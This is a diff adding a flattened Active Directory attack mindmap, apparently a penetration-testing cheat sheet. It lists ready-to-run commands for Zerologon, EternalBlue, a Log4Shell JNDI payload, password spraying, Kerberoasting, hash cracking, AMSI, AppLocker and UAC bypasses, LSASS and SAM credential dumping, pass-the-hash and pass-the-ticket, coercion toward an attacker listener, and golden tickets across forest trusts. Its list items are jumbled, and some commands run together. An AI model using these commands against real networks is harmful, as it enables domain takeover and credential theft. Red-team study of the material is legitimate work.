+<h2 id="classic-quick-compromission-methods">Classic quick compromission methods<a class="headerlink" href="#classic-quick-compromission-methods" title="Permanent link">¶</a></h2>
+<ul>
+<li><code>zerologon-scan '&lt;dc_netbios_name&gt;' '&lt;ip&gt;'</code></li>
+<li>zerologon (unsafe)(CVE-2020-1472)</li>
+<li><code>python3 cve-2020-1472-exploit.py &lt;MACHINE_BIOS_NAME&gt; &lt;ip&gt;secretsdump.py &lt;DOMAIN&gt;/&lt;MACHINE_BIOS_NAME&gt;\$@&lt;IP&gt; -no-pass -just-dc-user "Administrator" secretsdump.py -hashes :&lt;HASH_admin&gt; &lt;DOMAIN&gt;/Administrator@&lt;IP&gt;</code></li>
+<li><code>python3 restorepassword.py -target-ip &lt;IP&gt; &lt;DOMAIN&gt;/&lt;MACHINE_BIOS_NAME&gt;@&lt;MACHINE_BIOS_NAME&gt; -hexpass &lt;HEXPASS&gt;</code></li>
+<li>Admin</li>
+<li>Domain Admin</li>
+<li>Eternal BlueMS17-010</li>
+<li>exploit/windows/smb/ms17_010_eternalblue</li>
+<li>use scanner/smb/smb_enum_gpp</li>
+<li>SYSVOL &amp; GPPMS14-025</li>
+<li><code>findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</code></li>
+<li>auxiliary/scanner/http/tomcat_enumexploit/multi/http/tomcat_mgr_deploy</li>
+<li>tomcat/jboss manager</li>
+<li>Low hanging fruit</li>
+<li>java rmi</li>
+<li>exploit/multi/misc/java_rmi_server</li>
+<li>java serialized port</li>
+<li>ysoserial</li>
+<li>vulnerable product with cve</li>
+<li>searchsploit</li>
+<li>proxylogon</li>
+<li>Low Access</li>
+<li>proxyshell</li>
+<li>log4shell</li>
+<li>${jndi:ldap://<ip>:<port>/o=reference}</port></ip></li>
+<li>rogueJndi-1.0.jar</li>
+<li>database credentials</li>
+<li>use admin/mssql/mssql_enum_sql_logins</li>
+<li>MSSQL connection</li>
+<li>...</li>
+</ul>
+<h2 id="got-username-but-no-password">Got username but no password<a class="headerlink" href="#got-username-but-no-password" title="Permanent link">¶</a></h2>
+<ul>
+<li><code>cme &lt;IP&gt; -u 'user' -p 'password' --pass-pol</code></li>
+<li><code>enum4linx -u 'username' -p 'password' -P &lt;IP&gt;</code></li>
+<li>Get password policy (need creds, but you should get the policy before starting a spray)</li>
+<li><code>Get-ADDefaultDomainPasswordPolicy</code></li>
+<li><code>Get-ADFineGrainedPasswordPolicy -filter *</code></li>
+<li><code>Get-ADUserResultantPasswordPolicy -Identity &lt;user&gt;</code></li>
+<li>FGPP</li>
+<li><code>ldapsearch-ad.py --server '&lt;dc&gt;' -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; --type pass-pols</code></li>
+<li>🔥Password spray</li>
+<li><code>cme smb &lt;dc-ip&gt; -u user.txt -p password.txt --no-bruteforce # test user=password</code></li>
+<li><code>cme smb &lt;dc-ip&gt; -u user.txt -p password.txt # multiple test (carrefull of lock policy)</code></li>
+<li>Clear text credentials found</li>
+<li><code>sprayhound -U &lt;users.txt&gt; -d &lt;domain&gt; -dc &lt;dcip&gt;</code></li>
+<li><code>Get-DomainUser -PreauthNotRequired -Properties SamAccountName</code></li>
+<li>Got valid username</li>
+<li>Get ASREPRoastable users (need creds)</li>
+<li>MATCH (u:User {dontreqpreauth:true}), (c:Computer), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p</li>
+<li><code>python GetNPUsers.py &lt;domain&gt;/ -usersfile &lt;usernames.txt&gt; -format hashcat -outputfile &lt;hashes.domain.txt&gt;</code></li>
+<li>Hash found (ASREP)</li>
+<li>Get hash</li>
+<li>Rubeus.exe asreproast /format:hashcat</li>
+<li>ASREPRoast</li>
+<li><code>Rubeus.exe keberoast /domain:&lt;domain&gt; /dc:&lt;dcip&gt; /nopreauth: &lt;asrep_user&gt; /spns:&lt;users.txt&gt;</code></li>
+<li>Hash found (TGS)</li>
+<li>Blind Kerberoasting</li>
+<li><code>GetUserSPNs.py -no-preauth "&lt;asrep_user&gt;" -usersfile "&lt;user_list.txt&gt;" -dc-host "&lt;dc_ip&gt;" "&lt;domain&gt;"/</code></li>
+<li><code>python3 CVE-2022-33679.py &lt;domain&gt;/&lt;user&gt; &lt;target&gt;</code></li>
+<li>Lateral move (PTT)</li>
+<li>CVE-2022-33679</li>
+</ul>
+<h2 id="known-vulnerabilities">Known vulnerabilities<a class="headerlink" href="#known-vulnerabilities" title="Permanent link">¶</a></h2>
+<ul>
+<li><code>rpcclient $&gt; lookupnames &lt;name&gt;wmic useraccount get name,sidauxiliary/admin/kerberos/ms14_068_kerberos_checksum</code></li>
+<li>dom admin</li>
+<li>Pass the ticket</li>
+<li>Admin</li>
+<li>MS14-068</li>
+<li><code>FindSMB2UPTime.py &lt;ip&gt;</code></li>
+<li><code>goldenPac.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:'&lt;password&gt;'@&lt;target&gt;</code></li>
+<li><code>python privexchange.py -ah &lt;attacker_host_or_ip&gt; &lt;exchange_host&gt; -u &lt;user&gt; -d &lt;domain&gt; -p &lt;password&gt;</code></li>
+<li>Coerce HTTP -&gt;</li>
+<li>privexchange(CVE-2019-0724, CVE-2019-0686)</li>
+<li><code>cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -M nopac</code></li>
+<li>scan</li>
+<li><code>.\noPac.exe -domain &lt;domain&gt; -user &lt;user&gt; -pass &lt;pass&gt; /dc &lt;dc_fqdn&gt; /mAccount &lt;machine_account&gt; /mPassword &lt;machine_pass&gt; /service cifs /ptt</code></li>
+<li>🔥SamAccountName / nopacCVE-2021-42287/CVE-2021-42278</li>
+<li>Delete computer</li>
+<li>DCSYNC</li>
+<li>DOM ADMIN</li>
+<li>with impacket : addcomputer.py / addspn.py / renameMachine.py / getTGT.py / renameMachine.py / getST.py</li>
+<li><code>CVE-2021-1675.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target&gt; '\\&lt;smb_server_ip&gt;\&lt;share&gt;\inject.dll'</code></li>
+<li>🔥PrintNightmare (CVE-2021-1675 / CVE-2021-34527)</li>
+<li>🔥Certifried(CVE-2022-26923)(need ADCS)</li>
+<li><code>certipy account create -u &lt;user&gt;@&lt;domain&gt; -p '&lt;password&gt;' -user 'certifriedpc' -pass 'certifriedpass' -dns '&lt;fqdn_dc&gt;'</code></li>
+<li><code>certipy req -u 'certifriedpc$'@&lt;domain&gt; -p 'certifriedpass' -target &lt;ca_fqdn&gt; -ca &lt;ca_name&gt; -template Machine</code></li>
+<li><code>certipy auth -pfx &lt;pfx_file&gt; -username '&lt;dc&gt;$' -domain &lt;domain&gt; -dc-ip &lt;dc_ip&gt;</code></li>
+</ul>
+<h2 id="cracking-hash">Cracking hash<a class="headerlink" href="#cracking-hash" title="Permanent link">¶</a></h2>
+<ul>
+<li><code>john --format=lm hash.txt</code></li>
+<li>LM</li>
+<li><code>hashcat -m 3000 -a 3 hash.txt</code></li>
+<li><code>john --format=nt hash.txt</code></li>
+<li>NTLM</li>
+<li><code>hashcat -m 1000 -a 3 hash.txt</code></li>
+<li><code>john --format=netntlm hash.txt</code></li>
+<li>NetNTLMv1</li>
+<li><code>hashcat -m 5500 -a 3 hash.txt</code></li>
+<li>https://crack.sh/</li>
+<li><code>john --format=netntlmv2 hash.txt</code></li>
+<li>NetNTLMv2</li>
+<li>User accountclear text pass</li>
+<li><code>hashcat -m 5600 -a 0 hash.txt rockyou.txt</code></li>
+<li>Crack Hash</li>
+<li><code>hashcat -m 13100 -a 0 spn.txt rockyou.txt</code></li>
+<li>Kerberos 5 TGS</li>
+<li><code>john spn.txt --format=krb5tgs --wordlist=rockyou.txt</code></li>
+<li>Kerberos 5 TGS AES128</li>
+<li><code>hashcat -m 19600 -a 0 spn.txt rockyou.txt</code></li>
+<li>Kerberos 5 TGS AES256</li>
+<li><code>hashcat -m 19700 -a 0 spn.txt rockyou.txt</code></li>
+<li><code>hashcat -m 18200 -a 0 AS-REP_roast-hashes rockyou.txt</code></li>
+<li>Kerberos ASREP</li>
+<li>MsCache 2 (slow)</li>
+<li><code>hashcat -m 2100 -a 0 mscache-hash rockyou.txt</code></li>
+</ul>
+<h2 id="privilege-escalation">Privilege escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">¶</a></h2>
+<ul>
+<li><code>Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe (dll/msi/...)</code></li>
+<li>Get Applocker info</li>
+<li>winpeas.exe</li>
+<li>https://amsi.fail/</li>
+<li>AMSI bypass</li>
+<li>Reflection method</li>
+<li>Patching amsi.dll</li>
+<li>search password files</li>
+<li>findstr /si 'password' *.txt *.xml *.docx</li>
+<li>User accountclear text pass</li>
+<li>use C:\Windows\Tasks</li>
+<li>use C:\Windows\Temp</li>
+<li>AppLocker (whitelisting) bypass</li>
+<li>installutil.exe /logfile= /LogToConsole=false /U C:\runme.exe</li>
+<li>Low access (without applocker)</li>
+<li>Powershell CLM bypass</li>
+<li>mshta.exe my.hta</li>
+<li>MSBuild</li>
+<li>Low access</li>
+<li>FodHelper</li>
+<li>User Access Control (UAC) bypass</li>
+<li>WSReset</li>
+<li>MSDT</li>
+<li>SMBGhost CVE-2020-0796</li>
+<li>CVE-2021-36934 (HiveNightmare/SeriousSAM)</li>
+<li>Admin Access</li>
+<li>RoguePotato</li>
+<li>service account (IIS/Mssql) (got SEImpersonate)</li>
+<li>Juicy Potato / Lovely Potato</li>
+<li>🔥 PrintSpoofer</li>
+<li><code>.\KrbRelayUp.exe relay -Domain &lt;domain&gt; -CreateNewComputerAccount -ComputerName &lt;computer$&gt; -ComputerPassword &lt;password&gt;</code></li>
+<li><code>./KrbRelayUp.exe spawn -m rbcd -d &lt;omdain&gt; -dc &lt;dc&gt; -cn &lt;computer_name&gt;-cp &lt;omputer_pass&gt;</code></li>
+<li>🔥 KrbRelayUp</li>
+<li>...</li>
+</ul>
+<h2 id="lateral-move">Lateral Move<a class="headerlink" href="#lateral-move" title="Permanent link">¶</a></h2>
+<ul>
+<li>WSUSpendu.ps1 # need compromised WSUS server</li>
+<li>WSUSpect</li>
+<li>CMPivot</li>
+<li>sccm admin</li>
+<li>abuse sccm</li>
+<li>PowerSCCM</li>
+<li>Administrator access</li>
+<li>SharpSCCM</li>
+<li><code>cme mssql &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt;</code></li>
+<li>find mssql access</li>
+<li>MATCH p=(u:User)-[:SQLAdmin]-&gt;(c:Computer) RETURN p</li>
+<li>Users with SQLadmin</li>
+<li>EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;</li>
+<li>EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;</li>
+<li><code>EXEC xp_cmdshell '&lt;cmd&gt;'</code></li>
+<li>Low Access</li>
+<li><code>Get-SQLServerLinkCrawl -username &lt;user&gt; -password &lt;pass&gt; -Verbose -Instance &lt;sql_instance&gt; -Query "&lt;query&gt;"</code></li>
+<li>MSSQL</li>
+<li>trust link</li>
+<li>use exploit/windows/mssql/mssql_linkcrawler</li>
+<li>enum_db</li>
+<li>enable_xp_cmdshell</li>
+<li>xp_cmdshell <cmd></cmd></li>
+<li>exec_as_user <user></user></li>
+<li><code>mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt; (pr #1397)</code></li>
+<li>enum_impersonate</li>
+<li>exec_as_login <login></login></li>
+<li>xp_dir_tree <ip></ip></li>
+<li>coerce SMB -&gt;</li>
+<li>trustlink</li>
+<li>sp_linkedservers</li>
+<li>use_link</li>
+<li><code>cme smb -u &lt;user&gt; -p &lt;pass&gt;' &lt;ip&gt; --local-auth</code></li>
+<li>Local User</li>
+<li>impacket like cleartext pasword without domain/</li>
+<li><code>psexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code></li>
+<li>Authority/sytem</li>
+<li><code>psexec.exe -AcceptEULA \\&lt;ip&gt;</code></li>
+<li><code>interactive-shell</code></li>
+<li><code>mimikatz "privilege::debug sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt;"</code></li>
+<li><code>atexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt; "command"</code></li>
+<li><code>smbexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code></li>
+<li><code>wmiexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code></li>
+<li><code>pseudo-shell (file write and read)</code></li>
+<li><code>dcomexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code></li>
+<li>Password</li>
+<li>Cleartext password</li>
+<li><code>crackmapexec smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt;</code></li>
+<li><code>crackmapexec smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -local-auth</code></li>
+<li>WinRM</li>
+<li><code>evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt;</code></li>
+<li>Low access</li>
+<li><code>xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /p:&lt;password&gt; /v:&lt;ip&gt;</code></li>
+<li>High access</li>
+<li>RDP</li>
+<li><code>smbclient.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code></li>
+<li>SMB</li>
+<li>search files</li>
+<li><code>crackmapexec mssql &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt;</code></li>
+<li><code>mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code></li>
+<li><code>psexec.py -hashes ":&lt;hash&gt;" &lt;user&gt;@&lt;ip&gt;</code></li>
+<li>Lateral move</li>
+<li><code>atexec.py -hashes ":&lt;hash&gt;" &lt;user&gt;@&lt;ip&gt; "command"</code></li>
+<li><code>smbexec.py -hashes ":&lt;hash&gt;" &lt;user&gt;@&lt;ip&gt;</code></li>
+<li><code>wmiexec.py -hashes ":&lt;hash&gt;" &lt;user&gt;@&lt;ip&gt;</code></li>
+<li><code>dcomexec.py -hashes ":&lt;hash&gt;" &lt;user&gt;@&lt;ip&gt;</code></li>
+<li><code>crackmapexec smb &lt;ip_range&gt; -u &lt;user&gt; -d &lt;domain&gt; -H ':&lt;hash&gt;'</code></li>
+<li>🔥 Pass the hash (PTH)</li>
+<li><code>crackmapexec smb &lt;ip_range&gt; -u &lt;user&gt; -H ':&lt;hash&gt;' --local-auth</code></li>
+<li><code>evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -H &lt;hash&gt;</code></li>
+<li><code>reg.py &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -hashes ':&lt;hash&gt;' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'</code></li>
+<li><code>xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;hash&gt; /v:&lt;ip&gt;</code></li>
+<li>NTLM Hash</li>
+<li><code>smbclient.py -hashes ":&lt;hash&gt;" &lt;user&gt;@&lt;ip&gt;</code></li>
+<li><code>crackmapexec mssql &lt;ip_range&gt; -H ':&lt;hash&gt;'</code></li>
+<li><code>mssqlclient.py -windows-auth -hashes ":&lt;hash&gt;" &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt;</code></li>
+<li><code>Rubeus ptt /ticket:&lt;ticket&gt;</code></li>
+<li><code>Rubeus asktgt /user:victim /rc4:&lt;rc4value&gt;</code></li>
+<li>Rubeus createnetonly /program:C:\Windows\System32[cmd.exe||upnpcont.exe]</li>
+<li><code>Rubeus ptt /luid:0xdeadbeef /ticket:&lt;ticket&gt;</code></li>
+<li>Pass the ticket</li>
+<li><code>getTGT.py &lt;domain&gt;/&lt;user&gt; -hashes :&lt;hashes&gt;</code></li>
+<li>overpass the hash / pass the key (PTK)</li>
+<li><code>getTGT.py -aesKey '&lt;key&gt;' &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt;</code></li>
+<li><code>ticketConverter.py &lt;kirbi||ccache&gt; &lt;ccache||kirbi&gt;</code></li>
+<li>Convert format</li>
+<li><code>export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache</code></li>
+<li><code>impacket tools: Same as Pass the hash but use : -k and -no-pass for impacket</code></li>
+<li><code>mimikatz kerberos::ptc "&lt;ticket&gt;"</code></li>
+<li><code>Rubeus.exe ptt /ticket:&lt;ticket&gt;</code></li>
+<li>Pass the ticket(ccache / kirbi)</li>
+<li><code>proxychains secretsdump -k'&lt;domain&gt;'/'&lt;user&gt;'@'&lt;ip&gt;'</code></li>
+<li>see dcsync</li>
+<li>Kerberos</li>
+<li><code>tgssub.py -in &lt;ticket.ccache&gt; -out &lt;newticket.ccache&gt; -altservice "&lt;service&gt;/&lt;target&gt;" #pr 1256</code></li>
+<li>Pass the Ticket</li>
+<li>modify SPN</li>
+<li><code>impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)</code></li>
+<li>aesKey</li>
+<li><code>proxychains secretsdump -aesKey &lt;key&gt; '&lt;domain&gt;'/'&lt;user&gt;'@'&lt;ip&gt;'</code></li>
+<li><code>proxychains lookupsid.py &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -no-pass -domain-sids</code></li>
+<li>Users</li>
+<li><code>proxychains mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -no-pass</code></li>
+<li><code>proxychains secretsdump -no-pass '&lt;domain&gt;'/'&lt;user&gt;'@'&lt;ip&gt;'</code></li>
+<li>Socks (with NTLM relay)</li>
+<li><code>proxychains atexec.py -no-pass &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; "command"</code></li>
+<li><code>proxychains smbexec.py -no-pass &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt;</code></li>
+<li><code>proxychains smbclient.py -no-pass &lt;user&gt;@&lt;ip&gt;</code></li>
+<li>get hash NTLM from certificate</li>
+<li><code>certipy auth -pfx &lt;crt_file&gt; -dc-ip &lt;dc_ip&gt;</code></li>
+<li>NTLM hash</li>
+<li><code>gettgtpkinit.py -cert-pfx "&lt;pfx_file&gt;" ^[-pfx-pass "&lt;cert-password&gt;"] "&lt;fqdn_domain&gt;/&lt;user&gt;" "&lt;tgt_ccache_file&gt;"</code></li>
+<li>Certificate (pfx)</li>
+<li>pkinit</li>
+<li><code>Rubeus.exe asktgt /user:"&lt;username&gt;" /certificate:"&lt;pfx_file&gt;" [/password:"&lt;certificate_password&gt;"] /domain:"&lt;fqdn-domain&gt;" /dc:"&lt;dc&gt;" /show</code></li>
+<li>Pass the Certificate</li>
+<li>Schannel</li>
+<li><code>certipy auth -pfx &lt;crt_file&gt; -ldap-shell</code></li>
+<li>add_computer</li>
+<li>set_rbcd</li>
+<li>RBCD</li>
+</ul>
+<h2 id="got-administrator-access-on-one-machine">got administrator access on one machine<a class="headerlink" href="#got-administrator-access-on-one-machine" title="Permanent link">¶</a></h2>
+<ul>
+<li>PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp</lsass.exe|lsass_pid></li>
+<li>LSASS as a Protected Process</li>
+<li><code>mimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "!processprotect /process:lsass.exe" "!-" #with mimidriver.sys</code></li>
+<li><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></li>
+<li><code>mimikatz "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"</code></li>
+<li>User + Pass</li>
+<li><code>mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"</code></li>
+<li>Extract credentialsfrom LSASS</li>
+<li>Hashes NTLM</li>
+<li>load kiwi</li>
+<li>creds_all</li>
+<li><code>cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -M lsassy</code></li>
+<li>Lateral move (PTH/PTK)(clear text pass in some case)</li>
+<li><code>🔥lsassy -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; &lt;ip&gt;</code></li>
+<li><code>cme smb &lt;ip_range&gt; -u &lt;user&gt; -p '&lt;password&gt;' --sam</code></li>
+<li>hashdump</li>
+<li><code>reg save HKLM\SAM &lt;file&gt;; reg save HKLM\SECURITY &lt;file&gt;; reg save HKLM\SYSTEM &lt;file&gt;</code></li>
+<li><code>secretsdump.py -system SYSTEM -sam SAM LOCAL</code></li>
+<li>mklink /d c:\shadowcopy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\</li>
+<li>shadow copies</li>
+<li>diskshadow list shadows all</li>
+<li>Extract credentialsfrom SAM</li>
+<li>Lateral move PTH</li>
+<li><code>mimikatz "privilege::debug" "lsadump::sam" "exit"</code></li>
+<li><code>🔥secretsdump.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code></li>
+<li><code>reg.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt; backup -o '\\&lt;smb_ip&gt;\share'</code></li>
+<li><code>secretsdump.py -sam &lt;sam_file&gt; -system &lt;system_file&gt; LOCAL</code></li>
+<li>Administrator access</li>
+<li><code>cme smb &lt;ip_range&gt; -u &lt;user&gt; -p '&lt;password&gt;' --lsa</code></li>
+<li>Cached domain logon</li>
+<li>MsCache 2</li>
+<li>Machine account</li>
+<li>Extract credentials from LSA</li>
+<li>Service account</li>
+<li><code>secretsdump.py -security &lt;security_file&gt; -system &lt;system_file&gt; LOCAL</code></li>
+<li><code>🔥DonPAPI.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target&gt;</code></li>
+<li><code>mimikatz.exe "sekurlsa::dpapi"</code></li>
+<li>dpapi extract</li>
+<li><code>secretsdump.py &lt;domain&gt;/&lt;user&gt;:&lt;passwor&gt;@&lt;ip&gt;</code></li>
+<li>Lateral move (Clear text pass)</li>
+<li>search password files</li>
+<li>findstr /si 'password' *.txt *.xml *.docx</li>
+<li>search stored password</li>
+<li>lazagne.exe all</li>
+<li>%appdata%\Local\Google\Chrome\User Data\Default</li>
+<li>chrome</li>
+<li>SharpChromium.exe</li>
+<li><code>.\incognito.exe execute -c "&lt;domain&gt;\&lt;user&gt;" powershell.exe</code></li>
+<li>ACL</li>
+<li><code>.\incognito.exe list_tokens -u</code></li>
+<li>use incognito</li>
+<li><code>impersonate_token &lt;domain&gt;\\&lt;user&gt;</code></li>
+<li>token manipulation</li>
+<li>NT hash</li>
+<li><code>masky - d &lt;domain&gt; -u &lt;user&gt; (-p &lt;password&gt; || -k || -H &lt;hash&gt;) -ca &lt;certificate authority&gt; &lt;ip&gt;</code></li>
+<li>ccache</li>
+<li>Lateral move Pass the ticket</li>
+<li>Extract credentials with certificate authentication (ADCS required)</li>
+<li>pfx</li>
+<li>Lateral move Pass the certificate</li>
+</ul>
+<h2 id="valid-credentials">valid credentials<a class="headerlink" href="#valid-credentials" title="Permanent link">¶</a></h2>
+<ul>
+<li><code>GetADUsers.py -all -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;username&gt;</code></li>
+<li>Users</li>
+<li>Get all users</li>
+<li><code>cme smb &lt;ip&gt; -u &lt;user&gt; -p '&lt;password&gt;' --users</code></li>
+<li>enumerate SMB share</li>
+<li><code>cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --shares</code></li>
+<li>Account</li>
+<li><code>bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; -gc &lt;dc&gt; -c all</code></li>
+<li><code>./rusthound -d &lt;domain_to_enum&gt; -u '&lt;user&gt;@&lt;domain&gt;' -p '&lt;password&gt;' -o &lt;outfile&gt; -z</code></li>
+<li>ACL</li>
+<li>🔥bloodhound</li>
+<li>Delegation</li>
+<li><code>import-module sharphound.ps1;invoke-bloodhound -collectionmethod all -domain &lt;domain&gt;</code></li>
+<li>Domain enum</li>
+<li><code>sharphound.exe -c all -d &lt;domain&gt;</code></li>
+<li>Powerview / SharpView</li>
+<li>adPeas</li>
+<li>pingcastle</li>
+<li><code>Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName</code></li>
+<li>MATCH (u:User {hasspn:true}) RETURN u</li>
+<li>Get kerberoastable users</li>
+<li>MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p</li>
+<li>🔥kerberoasting</li>
+<li><code>GetUserSPNs.py -request -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;</code></li>
+<li>Got Account on the domainauthenticated(cleartext pass / kerberos / NTLM)</li>
+<li>hash found (TGS)</li>
+<li>Get hash</li>
+<li>Rubeus kerberoast</li>
+<li><code>dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query &lt;dc_ip&gt;</code></li>
+<li>Scan network</li>
+<li>Enum dns</li>
+<li><code>🔥 certipy find -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -dc-ip &lt;domaincontroller&gt;</code></li>
+<li>ADCS</li>
+<li>Enumerate AD CS</li>
+<li><code>cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -M webdav #find</code></li>
+<li><code>start webdav with Documents.searchConnector-ms file</code></li>
+<li>Webdav</li>
+<li><code>coerce with &lt;attacker_hostname&gt;@80/something as target</code></li>
+<li>Coerce HTTP -&gt;</li>
+<li><code>rpcdump.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;domain_server&gt; | grep MS-RPRN</code></li>
+<li><code>printerbug.py '&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;'@&lt;Printer IP&gt; &lt;listener_ip&gt;</code></li>
+<li>Coerce</li>
+<li><code>PetitPotam.py -d &lt;domain&gt; -u &lt;user&gt;-p &lt;password&gt; &lt;listener_ip&gt; &lt;target_ip&gt;</code></li>
+<li>Coerce SMB -&gt;</li>
+<li><code>🔥coercer.py -u &lt;user&gt; -d &lt;domain&gt; -p &lt;password&gt; -t &lt;target&gt; -l &lt;attacker_ip&gt;</code></li>
+<li>exploit !</li>
+<li>Known vulnerabilities</li>
+<li>connect to computer</li>
+<li>Lateral move</li>
+</ul>
+<h2 id="trust-relationship-forest-to-forest">Trust relationship / Forest to Forest<a class="headerlink" href="#trust-relationship-forest-to-forest" title="Permanent link">¶</a></h2>
+<ul>
+<li>nltest.exe /trusted_domains</li>
+<li><code>([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</code></li>
+<li>Enumeration</li>
+<li><code>Get-DomainTrust -Domain &lt;domain&gt;</code></li>
+<li><code>Get-DomainTrustMapping</code></li>
+<li><code>mimikatz kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;domain_sid&gt; /aes256:&lt;trust_key_aes256&gt; /sids:&lt;target_domain_sid&gt;-519 /service:krbtgt /target:&lt;target_domain&gt; /ptt</code></li>
+<li><code>mimikatz lsadump::trust /patch</code></li>
+<li>Pass the ticket</li>
+<li><code>Get-DomainSID -Domain &lt;domain&gt;Get-DomainSID -Domain &lt;target_domain&gt;</code></li>
+<li>Child Domain to Forest Compromise - extra SIDs</li>
+<li><code>mimikatz kerberos::golden /user:Administrator /krbtgt:&lt;HASH_KRBTGT&gt; /domain:&lt;domain&gt; /sid:&lt;user_sid&gt; /sids:&lt;RootDomainSID-519&gt; /ptt</code></li>
+<li><code>mimikatz lsadump::dcsync /domain:&lt;domain&gt; /user:&lt;domain&gt;\krbtgt</code></li>
+<li>Breaking forest trust(printerbug or petitpotam to force the DC of the external forest to connect on a local unconstrained delegation machine. Capture TGT, inject into memory and dcsync)</li>
+<li>Uncontrained delegation</li>
+<li><code>MATCH p=(n:User)-[:MemberOf]-&gt;(m:Group) WHERE n.domain="&lt;domain&gt;" AND m.domain&lt;&gt;n.domain RETURN p</code></li>
+<li>Trust relationship</li>
+<li>Users with foreign Domain Group Membership</li>
+<li><code>MATCH p=(n:Group {domain:"&lt;domain&gt;"})-[:MemberOf]-&gt;(m:Group) WHERE m.domain&lt;&gt;n.domain AND n.name&lt;&gt;m.name RETURN p</code></li>
+<li>Groups with Foreign Domain Group Membership</li>
+<li>ForeignGroupMember</li>
+<li><code>Get-DomainForeignGroupMember -Domain &lt;target&gt;</code></li>
+<li><code>convertfrom-sid &lt;sid&gt;</code></li>
+<li>User on both domains</li>
+<li>ACL</li>
+<li>password reuse</li>
+<li>lateral move (creds/pth/...)</li>
+<li><code>mimikatz kerberos::golden /user:Administrator /krbtgt:&lt;HASH_KRBTGT&gt; /domain:&lt;domain&gt; /sid:&lt;user_sid&gt; /sids:&lt;RootDomainSID&gt;-&lt;GROUP_SID_SUP_1000&gt; /ptt</code></li>
+<li><code>(SID filtering, Find group with SID &gt; 1000)Get-DomainGroupMember -Identity "&lt;group&gt;" -Domain &lt;target_domain&gt;</code></li>
+<li>Forest To Forest - extra SID(SID History / TREAT_AS_EXTERNAL)</li>
+<li><code>Get-SQLServerLinkCrawl -username &lt;user&gt; -password &lt;pass&gt; -Verbose -Instance &lt;sql_instance&gt;</code></li>
+<li>MSSQL</li>
+<li>Forest to Forest Compromise - MSSQL trusted links</li>
+<li><code>mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt; (pr #1397)</code></li>
+<li>trustlink</li>
+<li>sp_linkedservers</li>
+<li>use_link</li>
+</ul>
